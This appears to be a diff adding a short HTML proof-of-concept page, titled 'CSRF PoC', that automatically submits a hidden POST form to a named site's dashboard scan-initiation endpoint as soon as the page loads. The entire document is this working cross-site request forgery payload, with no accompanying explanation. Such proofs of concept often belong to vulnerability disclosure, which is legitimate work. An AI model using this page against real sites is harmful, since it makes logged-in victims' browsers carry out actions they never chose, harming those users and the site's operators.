@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body onload="document.getElementById('csrfForm').submit();">
+    <form id="csrfForm" action="https://retect.xyz/dashboard/initiate_scan" method="POST">
+        <input type="hidden" name="owner" value="done">
+        <input type="hidden" name="repo_name" value="done">
+    </form>
+</body>
+</html>
